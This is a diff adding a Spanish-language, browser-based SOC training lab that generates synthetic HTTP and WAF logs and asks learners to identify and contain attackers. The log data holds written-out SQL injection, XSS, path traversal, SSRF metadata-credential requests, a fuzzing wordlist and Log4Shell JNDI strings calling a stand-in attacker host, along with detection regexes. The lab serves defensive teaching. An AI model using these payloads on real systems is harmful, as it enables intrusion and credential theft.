@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Laboratorio SOC · Análisis de logs HTTP sospechosos</title>
+<style>
+:root{--bg:#eef1f5;--pn:#fff;--tx:#18222e;--mu:#5d6c7c;--ln:#d3dae2;--ac:#1f5fbf;--bad:#c4361b;--ok:#18815f;--wa:#b87500}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--tx);font:15px/1.5 system-ui,-apple-system,"Segoe UI",sans-serif}
+code,.mono,input,td.m{font-family:ui-monospace,Menlo,Consolas,monospace}
+header{background:#18222e;color:#e8eef5;padding:16px 22px;display:flex;flex-wrap:wrap;gap:10px;justify-content:space-between;align-items:center}
+h1{margin:0;font-size:19px}h1 small{display:block;font-weight:400;font-size:13px;color:#9fb1c3}
+#pr{font-size:13px;color:#9fb1c3}
+.tabs{display:flex;gap:4px;padding:10px 22px 0;border-bottom:1px solid var(--ln);background:var(--pn)}
+.tabs button{border:0;background:none;padding:9px 16px;font:inherit;cursor:pointer;color:var(--mu);border-bottom:3px solid transparent}
+.tabs button[aria-selected=true]{color:var(--tx);border-color:var(--ac);font-weight:600}
+main{padding:18px 22px;max-width:1200px;margin:auto}
+.bar{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:10px}
+input,select{border:1px solid var(--ln);border-radius:6px;padding:7px 9px;font-size:13px;background:#fff;color:var(--tx)}
+input[type=search]{flex:1;min-width:220px}
+button.b{background:var(--ac);color:#fff;border:0;border-radius:6px;padding:8px 14px;cursor:pointer;font:inherit;font-size:14px}
+button.g{background:#fff;color:var(--tx);border:1px solid var(--ln)}
+button:focus-visible,input:focus-visible,select:focus-visible{outline:2px solid var(--wa);outline-offset:2px}
+.tw{background:var(--pn);border:1px solid var(--ln);border-radius:8px;overflow:auto;max-height:430px}
+table{border-collapse:collapse;width:100%;font-size:12.5px}
+th{position:sticky;top:0;background:#f5f7fa;text-align:left;padding:7px 9px;border-bottom:1px solid var(--ln);cursor:default;white-space:nowrap}
+th.s{cursor:pointer}th.s:hover{color:var(--ac)}
+td{padding:5px 9px;border-bottom:1px solid #edf0f4;white-space:nowrap;max-width:360px;overflow:hidden;text-overflow:ellipsis}
+tr.r{cursor:pointer}tr.r:hover,tr.sel{background:#eaf1fc}
+.s4{color:var(--wa)}.s5{color:var(--bad)}.s2{color:var(--ok)}
+.blk{color:var(--bad);font-weight:600}
+#det{background:var(--pn);border:1px solid var(--ln);border-left:4px solid var(--ac);border-radius:8px;padding:12px 16px;margin-top:12px;font-size:14px}
+#det pre{background:#f5f7fa;padding:8px;border-radius:6px;overflow:auto;font-size:12.5px;margin:6px 0;white-space:pre-wrap;word-break:break-all}
+.chip{display:inline-block;background:#fbe9e5;color:var(--bad);border-radius:99px;padding:1px 9px;font-size:12px;margin-right:6px}
+.chip.n{background:#e5f4ee;color:var(--ok)}
+.cnt{color:var(--mu);font-size:13px;margin:6px 0}
+.ch{background:var(--pn);border:1px solid var(--ln);border-radius:8px;padding:14px 16px;margin-bottom:12px}
+.ch.done{border-color:var(--ok)}.ch h3{margin:0 0 6px;font-size:16px}
+.fb{margin-top:8px;font-size:14px}.fb.ok{color:var(--ok)}.fb.no{color:var(--bad)}
+.lead{color:var(--mu);max-width:75ch}
+@media(max-width:700px){main{padding:12px}}
+</style>
+</head>
+<body>
+<header><h1>Laboratorio SOC · Análisis de logs HTTP sospechosos<small>Un WAF y un servidor web registraron una hora de tráfico. Encuentra a los atacantes y contén el incidente.</small></h1><div id="pr"></div></header>
+<div class="tabs" role="tablist"><button role="tab" data-t="logs" aria-selected="true">Logs</button><button role="tab" data-t="ips" aria-selected="false">Resumen por IP</button><button role="tab" data-t="waf" aria-selected="false">Reglas WAF</button><button role="tab" data-t="ret" aria-selected="false">Retos</button></div>
+<main id="m"></main>
+
+<script>
+// ---- Generador determinista de logs sintéticos (todo ficticio; IPs de documentación RFC 5737) ----
+let sd=7;const R=()=>{sd|=0;sd=sd+0x6D2B79F5|0;let t=Math.imul(sd^sd>>>15,1|sd);t=t+Math.imul(t^t>>>7,61|t)^t;return((t^t>>>14)>>>0)/4294967296};
+const pk=a=>a[Math.floor(R()*a.length)],ri=(a,b)=>a+Math.floor(R()*(b-a+1));
+const T0=Date.UTC(2026,9,7,9,0,0),rows=[];
+const add=(t,ip,m,p,st,b,ua,w,u)=>rows.push({t,ip,m,p,st,b,ua,w:w||'ALLOW',u:u||''});
+const UAH=['Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/118.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) Safari/605.1','Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Mobile Safari','Mozilla/5.0 (X11; Linux x86_64) Firefox/118.0'];
+const AT={sqli:'203.0.113.45',xss:'198.51.100.23',trav:'192.0.2.77',fuzz:'45.155.205.9',ssrf:'194.26.135.9',jndi:'77.91.124.20',bola:'185.220.101.5'};
+const bot=[];for(let i=0;i<14;i++)bot.push(`${pk([103,117,122,181,186])}.${ri(1,250)}.${ri(1,250)}.${ri(1,250)}`);
+const benignIps=[];for(let i=0;i<26;i++)benignIps.push(`${ri(80,95)}.${ri(1,250)}.${ri(1,250)}.${ri(1,250)}`);
+// tráfico legítimo
+const bp=['/','/products','/cart','/about','/contact','/static/app.js','/static/style.css','/api/items','/search?q=zapatos','/search?q=camiseta'];
+for(let i=0;i<140;i++){const p=R()<.3?'/products?id='+ri(1,40):pk(bp);add(T0+ri(0,3590)*1e3,pk(benignIps),'GET',p,R()<.05?404:200,ri(900,52000),pk(UAH))}
+add(T0+ri(0,3500)*1e3,benignIps[0],'GET','/apple-touch-icon.png',404,312,UAH[0]);
+add(T0+ri(0,3500)*1e3,benignIps[8],'GET',"/search?q=o'reilly",200,5100,UAH[2]);add(T0+ri(0,3500)*1e3,benignIps[9],'GET','/search?q=select+camiseta',200,4800,UAH[0]);
+benignIps.slice(1,7).forEach((ip,i)=>{const t=T0+ri(100,3400)*1e3,u=`cliente${i+1}@correo.es`;
+ if(i===2){add(t,ip,'POST','/login',401,512,UAH[1],'ALLOW',u);add(t+9e3,ip,'POST','/login',200,2048,UAH[1],'ALLOW',u)}else add(t,ip,'POST','/login',200,2048,pk(UAH),'ALLOW',u)});
+// SQLi
+[["/products?id=1'%20OR%20'1'='1",200,'ALLOW'],["/products?id=1'--",500,'ALLOW'],['/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users--',403,'BLOCK'],['/products?id=1;SELECT%20SLEEP(5)--',200,'ALLOW'],['/products?id=1%20AND%201=1',200,'ALLOW'],['/products?id=1%20UNION%20SELECT%20NULL,NULL--',403,'BLOCK'],["/products?id=1'%20OR%20SLEEP(5)--%20-",200,'ALLOW']].forEach((x,i)=>add(T0+600e3+i*7e3,AT.sqli,'GET',x[0],x[1],x[1]===403?199:ri(800,9000),i<5?'sqlmap/1.7.2#stable':UAH[0],x[2]));
+// XSS
+[['/search?q=%3Cscript%3Ealert(1)%3C/script%3E',200,'BLOCK'],['/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E',200,'ALLOW'],['/search?q=%22%3E%3Csvg%20onload%3Dalert(1)%3E',200,'ALLOW']].forEach((x,i)=>add(T0+1500e3+i*20e3,AT.xss,'GET',x[0],x[1],ri(4000,7000),UAH[3],x[2]));
+// Path traversal
+[['/download?file=../../../../etc/passwd',403,'BLOCK'],['/download?file=..%2f..%2f..%2fetc%2fpasswd',200,'ALLOW'],['/static/..%252f..%252fetc/shadow',404,'ALLOW']].forEach((x,i)=>add(T0+2100e3+i*11e3,AT.trav,'GET',x[0],x[1],x[1]===200?1824:300,'curl/8.4.0',x[2]));
+// Fuzzing de directorios
+const wl='admin login wp-login.php .git/config .env backup.zip phpmyadmin config.php test api/v1 old dev staging console server-status .htaccess robots.txt sitemap.xml uploads images js css includes tmp logs dashboard panel manager cgi-bin db.sql dump.sql private secret users account register debug info.php phpinfo.php .svn/entries .DS_Store web.config composer.json package.json readme.md license.txt swagger.json graphql actuator/health backup.tar.gz administrator wp-admin xmlrpc.php shell.php cmd.php upload.php'.split(' ');
+wl.forEach((w,i)=>add(T0+1000e3+i*ri(250,500),AT.fuzz,'GET','/'+w,['.git/config','admin'].includes(w)?(w==='admin'?403:200):['robots.txt','login'].includes(w)?200:404,w==='.git/config'?412:ri(150,300),'Fuzz Faster U Fool v2.0.0'));
+// Credential stuffing (botnet)
+const us=[];for(let i=1;i<=42;i++)us.push(`user${i}@mail.com`);let k=0;
+bot.forEach((ip,i)=>{for(let j=0;j<3;j++){k++;const ok=k%7===0;add(T0+1800e3+(i*37+j*160+ri(0,20))*1e3,ip,'POST','/login',ok?200:401,ok?2048:512,'python-requests/2.31.0',ok?'ALLOW':(k%5===0?'BLOCK':'ALLOW'),us[(k*5)%42])}});
+// SSRF
+[['http://169.254.169.254/latest/meta-data/iam/security-credentials/',200,'ALLOW',286],['http://localhost:8080/admin',200,'ALLOW',1330],['http://10.0.0.5:6379/',403,'BLOCK',199]].forEach((x,i)=>add(T0+2400e3+i*9e3,AT.ssrf,'GET','/api/import?url='+encodeURIComponent(x[0]),x[1],x[3],'Go-http-client/2.0',x[2]));
+// Log4Shell en cabeceras y ruta
+[['/','${jndi:ldap://x.attacker.example:1389/a}',200,'ALLOW'],['/','${${::-j}ndi:ldap://x.attacker.example:1389/a}',200,'ALLOW'],['/?x=${jndi:ldap://x.attacker.example/a}',UAH[0],403,'BLOCK']].forEach((x,i)=>add(T0+2700e3+i*14e3,AT.jndi,'GET',x[0],x[2],x[2]===403?199:5600,x[1],x[3]));
+// Enumeración de IDs (BOLA/IDOR) en la API
+for(let i=0;i<40;i++)add(T0+3000e3+i*900,AT.bola,'GET','/api/invoices/'+(1001+i),(1001+i)%4===0?404:200,(1001+i)%4===0?64:ri(900,1800),'axios/1.6.0');
+rows.sort((a,b)=>a.t-b.t);
+const hh=t=>new Date(t).toISOString().slice(11,19),dec=p=>{try{return decodeURIComponent(decodeURIComponent(p))}catch(e){try{return decodeURIComponent(p)}catch(x){return p}}};
+const raw=r=>`${r.ip} - - [07/Oct/2026:${hh(r.t)} +0000] "${r.m} ${r.p} HTTP/1.1" ${r.st} ${r.b} "${r.ua}" waf=${r.w}${r.u?' user='+r.u:''}`;
+const ind=p=>{const d=dec(p),o=[];if(/('|")\s*(or|and)\s|union\s+select|sleep\(|'--|;\s*select/i.test(d))o.push('Inyección SQL');if(/<script|onerror\s*=|onload\s*=|<svg|<img/i.test(d))o.push('XSS');if(/\.\.[\/\\]|etc\/(passwd|shadow)/i.test(d))o.push('Path traversal');if(/\.git|\.env|phpmyadmin|wp-login|\.svn|backup|\.sql|phpinfo|shell\.php/i.test(d))o.push('Ruta sensible');if(/url=/i.test(d)&&/169\.254\.|localhost|127\.0\.0\.1|\b10\.\d+\.\d+\.\d+/i.test(d))o.push('SSRF');if(/\$\{/.test(d))o.push('Log4Shell/JNDI');return o};
+const attackers=new Set([...Object.values(AT),...bot]),blocked=new Set();
+const ansComp=new Set(rows.filter(r=>bot.includes(r.ip)&&r.st===200).map(r=>r.u)).size,ansSqlAllow=rows.filter(r=>r.ip===AT.sqli&&r.w==='ALLOW').length;
+const ansBola=rows.filter(r=>r.ip===AT.bola&&r.st===200).length,wA=[AT.sqli,AT.xss,AT.trav,AT.ssrf,AT.jndi];
+const esc=s=>String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+let tab='logs',F={q:'',st:'',m:'',w:''},sel=null,sortK='n',sortD=-1,done={};
+try{done=JSON.parse(localStorage.getItem('soc_lab')||'{}')}catch(e){}
+const sv=()=>{try{localStorage.setItem('soc_lab',JSON.stringify(done))}catch(e){}};
+const sc=s=>s>=500?'s5':s>=400?'s4':'s2';
+
+function logs(){
+ const f=rows.filter(r=>(!F.q||(raw(r)+dec(r.p)).toLowerCase().includes(F.q.toLowerCase()))&&(!F.st||String(r.st)[0]===F.st)&&(!F.m||r.m===F.m)&&(!F.w||r.w===F.w));
+ $m.innerHTML=`<p class=lead>Haz clic en una petición para ver el detalle decodificado. Filtra por IP, ruta, código de estado o texto. Todo el tráfico es sintético.</p>
+ <div class=bar><input type=search id=q placeholder="Buscar IP, ruta, user-agent, usuario…" value="${esc(F.q)}" aria-label="Buscar"><select id=st aria-label="Estado"><option value="">Estado: todos<option value=2>2xx<option value=3>3xx<option value=4>4xx<option value=5>5xx</select><select id=mm aria-label="Método"><option value="">Método: todos<option>GET<option>POST</select><select id=ww aria-label="Acción WAF"><option value="">WAF: todas<option>ALLOW<option>BLOCK</select><button class="b g" id=cl>Limpiar</button></div>
+ <div class=cnt>${f.length} de ${rows.length} peticiones${f.length>300?' (mostrando 300)':''}</div>
+ <div class=tw><table><tr><th>Hora<th>IP<th>Método<th>Ruta<th>Estado<th>Bytes<th>User-Agent<th>WAF</tr>${f.slice(0,300).map(r=>`<tr class="r ${r===sel?'sel':''}" data-i="${rows.indexOf(r)}"><td>${hh(r.t)}<td class=m>${r.ip}<td>${r.m}<td class=m title="${esc(r.p)}">${esc(r.p)}<td class=${sc(r.st)}>${r.st}<td>${r.b}<td>${esc(r.ua)}<td class="${r.w==='BLOCK'?'blk':''}">${r.w}</tr>`).join('')}</table></div><div id=det hidden></div>`;
+ $('#st').value=F.st;$('#mm').value=F.m;$('#ww').value=F.w;
+ $('#q').oninput=e=>{F.q=e.target.value;const p=e.target.selectionStart;logs();$('#q').focus();$('#q').setSelectionRange(p,p)};
+ $('#st').onchange=e=>{F.st=e.target.value;logs()};$('#mm').onchange=e=>{F.m=e.target.value;logs()};$('#ww').onchange=e=>{F.w=e.target.value;logs()};
+ $('#cl').onclick=()=>{F={q:'',st:'',m:'',w:''};logs()};
+ document.querySelectorAll('tr.r').forEach(t=>t.onclick=()=>{sel=rows[+t.dataset.i];detail();document.querySelectorAll('tr.r').forEach(x=>x.classList.remove('sel'));t.classList.add('sel')});
+ if(sel)detail();
+}
+function detail(){const d=$('#det'),r=sel,t=ind(r.p+' '+r.ua);d.hidden=false;
+ d.innerHTML=`<b>Detalle de la petición</b><pre>${esc(raw(r))}</pre><div><b>Ruta decodificada:</b> <code>${esc(dec(r.p))}</code></div><div style="margin-top:6px"><b>Indicadores:</b> ${t.length?t.map(x=>`<span class=chip>${x}</span>`).join(''):'<span class="chip n">ninguno evidente</span>'}</div><div class=cnt>Más pistas: ¿qué hace esta IP en el resto del log? <button class="b g" id=fi>Filtrar por ${r.ip}</button></div>`;
+ $('#fi').onclick=()=>{F.q=r.ip;logs()}}
+
+function ips(){
+ const M={};rows.forEach(r=>{const o=M[r.ip]=M[r.ip]||{ip:r.ip,n:0,p:new Set(),e4:0,lg:0,us:new Set(),bl:0,ua:r.ua};o.n++;o.p.add(r.p.split('?')[0]);if(r.st===404)o.e4++;if(r.p==='/login'){o.lg++;o.us.add(r.u)}if(r.w==='BLOCK')o.bl++});
+ const A=Object.values(M).map(o=>({ip:o.ip,n:o.n,dp:o.p.size,e4:o.e4,lg:o.lg,du:o.us.size,bl:o.bl,ua:o.ua}));
+ A.sort((a,b)=>(a[sortK]>b[sortK]?1:-1)*sortD);
+ const H=[['ip','IP'],['n','Peticiones'],['dp','Rutas distintas'],['e4','404'],['lg','POST /login'],['du','Usuarios distintos'],['bl','Bloqueadas WAF']];
+ $m.innerHTML=`<p class=lead>Agregar por IP revela patrones que una línea suelta no muestra. Ordena por columna y marca las IPs que quieras bloquear en el firewall.</p><div class=tw style="max-height:520px"><table><tr><th>Bloquear${H.map(h=>`<th class=s data-k=${h[0]}>${h[1]}${sortK===h[0]?(sortD>0?' ▲':' ▼'):''}`).join('')}<th>User-Agent</tr>${A.map(o=>`<tr><td><input type=checkbox data-ip="${o.ip}" ${blocked.has(o.ip)?'checked':''} aria-label="Bloquear ${o.ip}"><td class=m>${o.ip}<td>${o.n}<td>${o.dp}<td>${o.e4}<td>${o.lg}<td>${o.du}<td>${o.bl}<td>${esc(o.ua)}</tr>`).join('')}</table></div>`;
+ document.querySelectorAll('th.s').forEach(h=>h.onclick=()=>{sortD=sortK===h.dataset.k?-sortD:-1;sortK=h.dataset.k;ips()});
+ document.querySelectorAll('input[type=checkbox]').forEach(c=>c.onchange=()=>c.checked?blocked.add(c.dataset.ip):blocked.delete(c.dataset.ip))}
+
+const CH=[
+ {id:1,t:'Inyección SQL',q:'¿Qué IP está intentando inyección SQL contra /products?',a:AT.sqli,fx:'Un solo parámetro con comillas, UNION SELECT y SLEEP es la firma clásica. Corrección: consultas parametrizadas en la aplicación; el WAF es una segunda capa.'},
+ {id:2,t:'Fuzzing de directorios',q:'¿Qué IP rastrea rutas con una herramienta de fuzzing (muchas rutas distintas, mayoría 404)?',a:AT.fuzz,fx:'Decenas de rutas en pocos segundos con User-Agent de ffuf. Ojo: /.git/config devolvió 200, así que se expuso el repositorio. Corrección: bloquear ficheros ocultos y limitar la tasa de 404 por IP.'},
+ {id:3,t:'Path traversal',q:'¿Qué IP intentó leer /etc/passwd con secuencias ../ (incluso codificadas)?',a:AT.trav,fx:'Una variante con %2f pasó el WAF y devolvió 200. Corrección: normalizar y decodificar antes de inspeccionar y validar el nombre de archivo contra una allowlist.'},
+ {id:4,t:'WAF con huecos',q:'La IP de inyección SQL lanzó varias peticiones. ¿Cuántas dejó pasar el WAF (ALLOW)?',a:ansSqlAllow,num:1,fx:'Las reglas solo cazaban UNION SELECT. Variantes basadas en comillas y SLEEP pasaron. Corrección: ampliar reglas (OWASP CRS) y, sobre todo, arreglar el código.'},
+ {id:5,t:'Credential stuffing',q:'Una red de IPs prueba credenciales filtradas contra /login (mismo UA, un intento por usuario). ¿Cuántas cuentas distintas se vieron comprometidas (respuesta 200 desde esas IPs)?',a:ansComp,num:1,fx:'Cada IP intenta pocas veces para evadir el bloqueo por IP. Corrección: MFA, limitación por cuenta y no solo por IP, detección de contraseñas filtradas y CAPTCHA adaptativo. Fuerza el cambio de contraseña de esas cuentas.'},
+ {id:6,t:'SSRF',q:'Una IP abusa de /api/import?url= para que el servidor consulte direcciones internas (metadatos cloud, localhost). ¿Qué IP es?',a:AT.ssrf,fx:'La primera petición devolvió 200 con credenciales del servicio de metadatos. Corrección: allowlist de destinos, bloquear rangos privados tras resolver DNS y exigir IMDSv2.'},
+ {id:7,t:'Log4Shell en cabeceras',q:'Alguien envía cadenas ${jndi:…} en el User-Agent y en la ruta. ¿Qué IP es? Pista: busca el texto en la pestaña Logs.',a:AT.jndi,fx:'La variante ofuscada ${${::-j}ndi:…} evita reglas que buscan "jndi:". Corrección: actualizar log4j, desactivar lookups y bloquear la secuencia ${ en cabeceras.'},
+ {id:8,t:'Enumeración de IDs (BOLA)',q:'Una IP recorre /api/invoices/N de forma secuencial con un cliente de scripting. ¿Cuántas facturas ajenas obtuvo (respuesta 200)?',a:ansBola,num:1,fx:'Ningún límite ni comprobación de propietario: cada ID válido devolvió datos. Corrección: autorización por objeto en el servidor, IDs no secuenciales (UUID) y alerta ante enumeración.'}];
+function ret(){
+ $m.innerHTML=`<p class=lead>Usa las pestañas Logs y Resumen por IP. Las soluciones se comprueban en tu navegador.</p>`+CH.map(c=>`<div class="ch ${done[c.id]?'done':''}"><h3>${c.id}. ${c.t} ${done[c.id]?'✔':''}</h3><div>${c.q}</div><div class=bar style="margin-top:8px"><input id=a${c.id} ${c.num?'type=number':''} placeholder="Tu respuesta" aria-label="Respuesta ${c.id}"><button class=b data-c=${c.id}>Comprobar</button></div><div class=fb id=f${c.id}>${done[c.id]?'<span class=ok>Resuelto. '+c.fx+'</span>':''}</div></div>`).join('')+
+ `<div class="ch ${done[9]?'done':''}"><h3>9. Contención ${done[9]?'✔':''}</h3><div>En <b>Resumen por IP</b> marca todas las IPs maliciosas (7 atacantes individuales y la botnet de 14 IPs) sin bloquear a usuarios legítimos. Después comprueba.</div><div class=bar style="margin-top:8px"><button class=b data-c=9>Comprobar bloqueos (${blocked.size} marcadas)</button></div><div class=fb id=f9></div></div>`;
+ document.querySelectorAll('button[data-c]').forEach(b=>b.onclick=()=>{const id=+b.dataset.c,f=$('#f'+id);
+  if(id===9){const miss=[...attackers].filter(i=>!blocked.has(i)).length,fp=[...blocked].filter(i=>!attackers.has(i));
+   if(!miss&&!fp.length){done[9]=1;sv();ret();$('#f9').innerHTML='<span class=ok>Contención perfecta. Recuerda que bloquear IPs es temporal: los atacantes rotan direcciones, así que las correcciones de fondo (parametrizar, MFA, normalizar entradas) siguen siendo imprescindibles.</span>';pr();return}
+   f.className='fb no';f.textContent=`Faltan ${miss} IPs maliciosas por bloquear${fp.length?` y has bloqueado ${fp.length} legítima(s): ${fp.join(', ')}`:''}.`;return}
+  const c=CH.find(x=>x.id===id),v=$('#a'+id).value.trim();
+  if(String(v)===String(c.a)){done[id]=1;sv();ret()}else{f.className='fb no';f.textContent='No es correcto. Revisa los datos y prueba otra vez.'}});pr()}
+let rxv='union\\s+select';
+function waf(){
+ const bad=rows.filter(r=>wA.includes(r.ip)),good=rows.filter(r=>benignIps.includes(r.ip));
+ $m.innerHTML=`<p class=lead>Escribe una expresión regular (sin distinguir mayúsculas) que se aplica a la ruta decodificada y al User-Agent de cada petición. Reto 10: bloquea todos los ataques de inyección, XSS, traversal, SSRF y Log4Shell sin bloquear tráfico legítimo.</p><div class=bar><input id=rx class=mono style="flex:1;min-width:260px" value="${esc(rxv)}" aria-label="Expresión regular"><button class=b id=tr>Probar regla</button><button class="b g" id=ex>Cargar regla ingenua</button></div><div id=wo></div>`;
+ const run=()=>{rxv=$('#rx').value;let re;try{re=new RegExp(rxv,'i')}catch(e){$('#wo').innerHTML='<div class="fb no">Expresión inválida: '+esc(e.message)+'</div>';return}
+  const h=r=>re.test(dec(r.p)+' '+r.ua),ok=bad.filter(h),miss=bad.filter(r=>!h(r)),fp=good.filter(h),win=!miss.length&&!fp.length,bx='<pre class=mono style="background:#fff;border:1px solid var(--ln);padding:8px;border-radius:6px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-all">';
+  if(win&&!done[10]){done[10]=1;sv();pr()}
+  $('#wo').innerHTML=`<div class=cnt><b>Ataques bloqueados:</b> ${ok.length}/${bad.length} · <b>Falsos positivos:</b> ${fp.length}</div>`+(win?'<div class="fb ok">Regla perfecta ✔. Recuerda que las firmas se evaden con nuevas ofuscaciones: úsalas como segunda capa junto a consultas parametrizadas, validación de entrada y actualizaciones.</div>':'')+(miss.length?`<div class=cnt>Ataques que pasan (${miss.length}):</div>${bx}${miss.slice(0,8).map(r=>esc(r.m+' '+dec(r.p)+'   UA: '+r.ua)).join('\n')}</pre>`:'')+(fp.length?`<div class=cnt>Tráfico legítimo bloqueado (${fp.length}):</div>${bx}${fp.slice(0,6).map(r=>esc(r.m+' '+dec(r.p))).join('\n')}</pre>`:'')};
+ $('#tr').onclick=run;$('#rx').onkeydown=e=>{if(e.key==='Enter')run()};$('#ex').onclick=()=>{$('#rx').value='union\\s+select';run()};run()}
+function pr(){$('#pr').textContent=`Retos resueltos: ${Object.keys(done).length}/10`}
+const $m=document.getElementById('m'),$=s=>document.querySelector(s);
+function show(){document.querySelectorAll('.tabs button').forEach(b=>b.setAttribute('aria-selected',b.dataset.t===tab));({logs,ips,waf,ret})[tab]();pr()}
+document.querySelectorAll('.tabs button').forEach(b=>b.onclick=()=>{tab=b.dataset.t;show()});
+show();
+</script>
+</body>
+</html>
